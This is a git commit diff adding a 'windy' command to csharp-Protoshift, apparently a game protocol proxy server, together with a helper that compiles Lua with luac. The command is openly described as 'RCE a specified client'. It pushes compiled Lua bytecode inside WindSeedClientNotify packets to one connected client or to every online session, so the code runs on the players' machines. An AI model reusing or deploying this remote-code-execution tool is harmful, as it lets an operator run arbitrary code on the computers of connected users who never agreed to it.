594df47c786f5241fcac1a9a9c4b96fe9797405b
YYHEggEgg <53960525+YYHEggEgg@users.noreply.github.com>
2023-07-11 20:27:10 +0800

    kcp bugfix & windy!

---
+++ csharp-Protoshift/Commands/Windy/WindyCommand.cs
@@ -0,0 +1,245 @@
+﻿using csharp_Protoshift.GameSession;
+using Google.Protobuf;
+using System.Text.Json;
+using YYHEggEgg.Logger;
+
+namespace csharp_Protoshift.Commands
+{
+    internal class WindyCommand : ICommandHandler
+    {
+        public string CommandName => "windy";
+
+        public string Description => "RCE a specified client.";
+
+        public string Usage => $"windy [command] <args>{Environment.NewLine}" +
+            $"  default command: execute a lua/luac file. {Environment.NewLine}" +
+            $"    windy <conv|\"everyone\"> [-c] <lua_path|luac_path>{Environment.NewLine}" +
+            $"      If use -c, the program will treat it as compiled lua, {Environment.NewLine}" +
+            $"      or the file extension will be used for judgement.{Environment.NewLine}" +
+            $"{Environment.NewLine}" +
+            $"  command --set-env: Set a directory as a default location that stores .lua files. {Environment.NewLine}" +
+            $"    windy --set-env <dir-full-path>{Environment.NewLine}" +
+            $"      After this you may invoke windy without path and extension, e.g. windy HideUI{Environment.NewLine}" +
+            $"{Environment.NewLine}" +
+            $"  command --set-luac: Set the luac executable path.{Environment.NewLine}" +
+            $"    windy --set-luac <luac-full-path>";
+
+        private WindyLuacManager windyExecute;
+        private bool _initFinished = false;
+        public const string WindyManagerPath = "windy_config.json";
+#pragma warning disable CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
+        public WindyCommand()
+#pragma warning restore CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
+        {
+            if (File.Exists(WindyManagerPath))
+            {
+                try
+                {
+                    var windy = JsonSerializer.Deserialize<WindyLuacManager>(
+                        File.ReadAllText(WindyManagerPath));
+                    if (windy == null)
+                    {
+                        Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
+                        InitNewWindyManager();
+                        AutoSave = false;
+                    }
+                    else
+                    {
+                        windyExecute = windy;
+                        Log.Info($"Successfully loaded windy config.", nameof(WindyCommand));
+                        AutoSave = true;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
+                    Log.Erro($"Read exception: {ex}", nameof(WindyCommand));
+                    InitNewWindyManager();
+                    AutoSave = false;
+                }
+                finally
+                {
+                    _initFinished = true;
+                }
+            }
+            else
+            {
+                InitNewWindyManager();
+                AutoSave = true;
+            }
+            savetimer = new((_) =>
+            {
+                if (AutoSave) SaveChanges();
+            }, null, 0, 60000);
+        }
+
+        private void InitNewWindyManager()
+        {
+            windyExecute = new();
+            Task.Run(async () => await windyExecute.TryModifyLuacExecutablePath("luac"));
+            _initFinished = true;
+        }
+
+        #region Save
+        public void CleanUp()
+        {
+            savetimer.Dispose();
+            SaveChanges();
+        }
+
+        private Timer savetimer;
+        private object save_lck = new object();
+        public void SaveChanges()
+        {
+            lock (save_lck)
+                File.WriteAllText(WindyManagerPath, JsonSerializer.Serialize(windyExecute));
+        }
+
+        public bool AutoSave { get; set; }
+        #endregion
+
+        public async Task HandleAsync(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Log.Erro($"windy require a command!", nameof(WindyCommand));
+                return;
+            }
+            if (args[0] == "--set-env")
+            {
+                if (windyExecute.SetEnvPath(args[1]))
+                    Log.Info($"Successfully set windy env path to {args[1]}.", nameof(WindyCommand));
+                else Log.Erro($"Failed to set windy env path to {args[1]}.", nameof(WindyCommand));
+                return;
+            }
+            else if (args[0] == "--set-luac")
+            {
+                if (await windyExecute.TryModifyLuacExecutablePath(args[1]))
+                    Log.Info($"Successfully set luac path to {args[1]}.", nameof(WindyCommand));
+                else Log.Erro($"Failed to set luac path to {args[1]}.", nameof(WindyCommand));
+                return;
+            }
+            #region Read param
+            uint specifiedconv = uint.MaxValue;
+            bool everyonewindy = false;
+            if (!uint.TryParse(args[0], out specifiedconv))
+            {
+                if (args[0] == "everyone") everyonewindy = true;
+                else
+                {
+                    Log.Erro($"Please use a correct windy command!", nameof(WindyCommand));
+                    return;
+                }
+            }
+            if (!everyonewindy)
+            {
+                if (!GameSessionDispatch.sessions.ContainsKey(specifiedconv))
+                {
+                    Log.Erro($"The specified conv: {specifiedconv} is not online!", nameof(WindyCommand));
+                    return;
+                }
+            }
+            else if (GameSessionDispatch.sessions.Count <= 0)
+            {
+                Log.Erro($"There are no sessions online.", nameof(WindyCommand));
+                return;
+            }
+            bool compiled = false;
+            string filePath;
+            if (args[1] == "-c")
+            {
+                compiled = true;
+                filePath = args[2];
+            }
+            else filePath = args[1];
+            if (File.Exists($"{windyExecute.EnvPath}/{filePath}"))
+            {
+                filePath = $"{windyExecute.EnvPath}/{filePath}";
+            }
+            else if (File.Exists($"{windyExecute.EnvPath}/{filePath}.lua"))
+            {
+                filePath = $"{windyExecute.EnvPath}/{filePath}.lua";
+            }
+            else if (!File.Exists(filePath) && File.Exists($"{filePath}.lua")) filePath += ".lua";
+            else
+            {
+                Log.Erro($"File: {filePath} found in neither windy env path nor working directory!", nameof(WindyCommand));
+                return;
+            }
+            #endregion
+            byte[] lua_compiled;
+#if !PROXY_ONLY_SERVER
+            NewProtos.WindSeedClientNotify rce_warning = new();
+#else
+            OldProtos.WindSeedClientNotify rce_warning = new();
+#endif
+            if (compiled)
+            {
+                lua_compiled = await File.ReadAllBytesAsync(filePath);
+            }
+            else
+            {
+                lua_compiled = await windyExecute.CompileLua(filePath);
+            }
+            rce_warning.AreaNotify.AreaCode = ByteString.CopyFrom(lua_compiled, 0, lua_compiled.Length);
+            #region Confirm
+            bool permitted = false;
+            FileInfo luafileInfo = new(filePath);
+            if (!everyonewindy) permitted = true;
+            else if (GameSessionDispatch.sessions.Count <= 1) permitted = true;
+            else if (GameSessionDispatch.sessions.Count <= 5)
+            {
+                Log.Warn($"You are sending WindSeed to every online session " +
+                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
+                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
+                Log.Warn($"Please carefully check the lua info. " +
+                    $"To confirm the execution, type 'y' and press Enter.", nameof(WindyCommand));
+                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
+                var res = await ConsoleWrapper.ReadLineAsync();
+                permitted = res.Trim().ToLower() == "y";
+            }
+            else
+            {
+                Log.Warn($"You are sending WindSeed to every online session " +
+                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
+                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
+                Log.Warn($"Please carefully check the lua info. To confirm the execution, " +
+                    $"type the file name \"{luafileInfo.Name}\" and press Enter.", nameof(WindyCommand));
+                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
+                var res = await ConsoleWrapper.ReadLineAsync();
+                permitted = res.Trim() == luafileInfo.Name;
+            }
+
+            if (!permitted)
+            {
+                Log.Erro($"User cancelled the windy execute.", nameof(WindyCommand));
+                return;
+            }
+            #endregion
+            if (!everyonewindy)
+            {
+                Program.ProxyServer.SendPacketToClient(specifiedconv,
+                    GameSessionDispatch.ConstructPacketSendToClient(
+                        specifiedconv, nameof(NewProtos.WindSeedClientNotify), null, lua_compiled));
+                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to session {specifiedconv}.", nameof(WindyCommand));
+            }
+            else
+            {
+                int total = GameSessionDispatch.sessions.Keys.Count;
+                int success = 0;
+                foreach (var conv in GameSessionDispatch.sessions.Keys)
+                {
+                    try
+                    {
+                        Program.ProxyServer.SendPacketToClient(conv,
+                            GameSessionDispatch.ConstructPacketSendToClient(
+                                conv, nameof(NewProtos.WindSeedClientNotify), null, lua_compiled));
+                        success++;
+                    }
+                    catch { }
+                }
+                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to {success}/{total} online session(s).", nameof(WindyCommand));
+            }
+        }
+    }
+}
---
+++ csharp-Protoshift/Commands/Windy/WindyLuacManager.cs
@@ -0,0 +1,246 @@
+﻿using System.Diagnostics;
+using System.Text.Json;
+using System.Text.Json.Serialization;
+using YYHEggEgg.Logger;
+
+namespace csharp_Protoshift.Commands
+{
+    internal class WindyLuacManager : IJsonOnDeserialized, IJsonOnSerializing
+    {
+        /// <summary>
+        /// Get the luac executable path. Notice that don't use the setter because it's used for <see cref="JsonSerializer"/>.
+        /// </summary>
+        public string? LuacExecutablePath { get; set; }
+        public async Task<bool> TryModifyLuacExecutablePath(string luacFullPath, bool slient = false)
+        {
+            if (!slient) Log.Info($"Verifying luac at: {luacFullPath}", nameof(WindyLuacManager));
+            try
+            {
+                var versionInfo = await new WindyOuterInvoke(luacFullPath, "-v").RunAsync();
+                if (!slient) Log.Info($"Got luac version: {versionInfo}", nameof(WindyLuacManager));
+                return true;
+            }
+            catch (Exception ex)
+            {
+                if (!slient) Log.Erro($"verify luac failed: {ex}", nameof(WindyLuacManager));
+                return false;
+            }
+        }
+
+        [JsonIgnore]
+        private Dictionary<string, (string luaHash, byte[] luacContent, string outputHash)> compiled_luacs = new();
+
+        public async Task<byte[]> CompileLua(string luaPath)
+        {
+            if (LuacExecutablePath == null)
+            {
+                throw new InvalidOperationException("The luac path has not been set.");
+            }
+            FileInfo luaFile = new(luaPath);
+            if (!luaFile.Exists)
+            {
+                throw new FileNotFoundException("The specified file does not exist.", luaFile.FullName);
+            }
+            var luaFileHash = GetFileHash(luaFile);
+            lock (lua_dict_lck)
+            {
+                if (compiled_luacs.TryGetValue(luaFile.FullName, out var tuple) && tuple.luaHash == luaFileHash)
+                {
+                    return tuple.luacContent;
+                }
+            }
+            Log.Info($"Start compiling lua file: {luaFile.FullName} (size: {luaFile.Length})", nameof(WindyLuacManager));
+            Stopwatch compileWatch = Stopwatch.StartNew();
+            string outputPath = $"{CompiledPath}/{Path.GetFileNameWithoutExtension(luaFile.Name)}.luac";
+            await WindyOuterInvoke.CompileAsync(LuacExecutablePath, luaFile, outputPath, EnvPath);
+            var res = await File.ReadAllBytesAsync(outputPath);
+            lock (lua_dict_lck) compiled_luacs[luaFile.FullName] = (luaFileHash, res, GetFileHash(new(outputPath)));
+            return res;
+        }
+
+        /// <summary>
+        /// Get the windy env path. Notice that don't use the setter because it's used for <see cref="JsonSerializer"/>.
+        /// </summary>
+        public string EnvPath { get; set; } = Environment.CurrentDirectory;
+        [JsonIgnore]
+        public string CompiledPath => $"{EnvPath}/windy_compiled"; // also Hardcoded at SetEnvPath method
+        public bool SetEnvPath(string newenvPath)
+        {
+            if (!Directory.Exists(newenvPath))
+            {
+                Log.Erro($"Path not exist: {newenvPath}. SetEnvPath failed. ", nameof(WindyLuacManager));
+                return false;
+            }
+            List<string> deprecated_files = new();
+            lock (lua_dict_lck)
+            {
+                foreach (var pair in compiled_luacs)
+                {
+                    var (luaHash, luacContent, outputHash) = pair.Value;
+                    string fileName = outputHash.Substring(0, outputHash.IndexOf('|'));
+                    if (!File.Exists($"{CompiledPath}/{fileName}"))
+                    {
+                        Log.Warn($"Compiled luac: {fileName} not found in windy env path. " +
+                            $"It'll be compiled again next time.", nameof(WindyLuacManager));
+                        deprecated_files.Add(pair.Key);
+                    }
+                    else if (GetFileHash(new($"{CompiledPath}/{fileName}")) != outputHash)
+                    {
+                        Log.Warn($"Compiled luac: {fileName} has changed since the last compile. " +
+                            $"It'll be compiled again next time.", nameof(WindyLuacManager));
+                        deprecated_files.Add(pair.Key);
+                    }
+                    else try
+                        {
+                            var frmFile = $"{CompiledPath}/{fileName}";
+                            var dstFile = $"{newenvPath}/windy_compiled/{fileName}";
+                            if (new FileInfo(frmFile).FullName != new FileInfo(dstFile).FullName)
+                            {
+                                File.Move(frmFile, dstFile);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Log.Warn($"Moving luac: {fileName} to new env folder failed. " +
+                                $"It'll be compiled again next time.", nameof(WindyLuacManager));
+                            Log.Warn(ex.ToString(), nameof(WindyLuacManager));
+                            deprecated_files.Add(pair.Key);
+                        }
+                }
+                foreach (var luaFile in deprecated_files)
+                    compiled_luacs.Remove(luaFile);
+            }
+            try
+            {
+                File.Delete($"{CompiledPath}/README.txt");
+                Directory.Delete(CompiledPath, false);
+            }
+            catch { }
+            EnvPath = newenvPath;
+            Directory.CreateDirectory(CompiledPath);
+            File.WriteAllText($"{CompiledPath}/README.txt", WINDY_COMPILED_README);
+            return true;
+        }
+
+        public static string GetFileHash(FileInfo info)
+        {
+            try
+            {
+                return $"{info.Name}|Size={info.Length}|WriteTime={info.LastWriteTime}|MD5={Tools.GetFileHash(info.FullName)}";
+            }
+            catch
+            {
+                return $"{info.Name}|EREADFAILURE|QueryTime={DateTime.Now:yyyy/MM/dd-HH:mm:ss.fffffff}|Random={Random.Shared.NextInt64()}";
+            }
+        }
+
+        private class WindyOuterInvoke
+        {
+            public readonly string ProgramPath;
+            public readonly string CommandLine;
+            public readonly string WorkingDirectory;
+
+            public WindyOuterInvoke(string programPath, string commandLine, string? workingDirectory = null)
+            {
+                ProgramPath = programPath ?? throw new ArgumentNullException(nameof(programPath));
+                CommandLine = commandLine ?? throw new ArgumentNullException(nameof(commandLine));
+                WorkingDirectory = workingDirectory ?? Environment.CurrentDirectory;
+            }
+
+            /// <summary>
+            /// Run the program with given params.
+            /// </summary>
+            /// <returns>The standard output content of running process.</returns>
+            /// <exception cref="IOException">Running failed.</exception>
+            internal async Task<string?> RunAsync()
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo(ProgramPath)
+                {
+                    Arguments = CommandLine,
+                    WorkingDirectory = WorkingDirectory,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true
+                };
+                Process? p = Process.Start(startInfo);
+                if (p == null) throw new IOException("The process is not started properly.");
+
+                await p.WaitForExitAsync();
+                if (p.ExitCode != 0) throw new IOException($"The process exited with code {p.ExitCode}.");
+
+                return await p.StandardOutput.ReadToEndAsync();
+            }
+
+            public static async Task<byte[]> CompileAsync(string luacPath, FileInfo luaFile,
+                string outputPath, string? workingDir = null)
+            {
+                workingDir ??= Environment.CurrentDirectory;
+                if (!luaFile.Exists)
+                {
+                    throw new FileNotFoundException("The specified file does not exist.", luaFile.FullName);
+                }
+                await new WindyOuterInvoke(luacPath, $"-o {outputPath} {luaFile.FullName}", workingDir).RunAsync();
+                return await File.ReadAllBytesAsync(outputPath);
+            }
+        }
+
+        #region Json serialization
+        public void OnDeserialized()
+        {
+            if (LuacExecutablePath != null &&
+                !TryModifyLuacExecutablePath(LuacExecutablePath, true).Result)
+            {
+                LuacExecutablePath = null;
+            }
+            if (!SetEnvPath(EnvPath))
+            {
+                Log.Warn($"The past env path is deprecated. Use working directory instead now.", nameof(WindyLuacManager));
+            }
+            else if (list_compiled_luacs != null)
+            {
+                foreach (var pair in list_compiled_luacs)
+                {
+                    var (luaHash, outputHash) = pair.Value;
+                    string fileName = outputHash.Substring(0, outputHash.IndexOf('|'));
+                    string outputPath = $"{CompiledPath}/{fileName}";
+                    if (File.Exists(pair.Key) && luaHash == GetFileHash(new(pair.Key)) &&
+                        File.Exists(outputPath) && outputHash == GetFileHash(new(outputPath)))
+                    {
+                        compiled_luacs.Add(pair.Key, (luaHash, File.ReadAllBytes(outputPath), outputHash));
+                    }
+                }
+            }
+        }
+
+        public void OnSerializing()
+        {
+            lock (lua_dict_lck)
+            {
+                list_compiled_luacs = new();
+                foreach (var pair in compiled_luacs)
+                {
+                    list_compiled_luacs.Add(new(pair.Key, (pair.Value.luaHash, pair.Value.outputHash)));
+                }
+            }
+        }
+
+        public List<KeyValuePair<string, (string luaHash, string outputHash)>>? list_compiled_luacs { get; set; }
+        #endregion
+
+        #region README content
+        private const string WINDY_COMPILED_README =
+@"This directory is created by csharp-Protoshift, storing .luac compiled results.
+
+It's essential for the windy command. 
+
+Don't modify/delete the files here when Protoshift server is running; 
+and don't place your files here as they will probably be lost.";
+
+        #endregion
+
+        #region Save locks
+        private object luac_exe_lck = "kinda"; // Unused
+        private object env_path_lck = "windy"; // Unused
+        private object lua_dict_lck = "today";
+        #endregion
+    }
+}
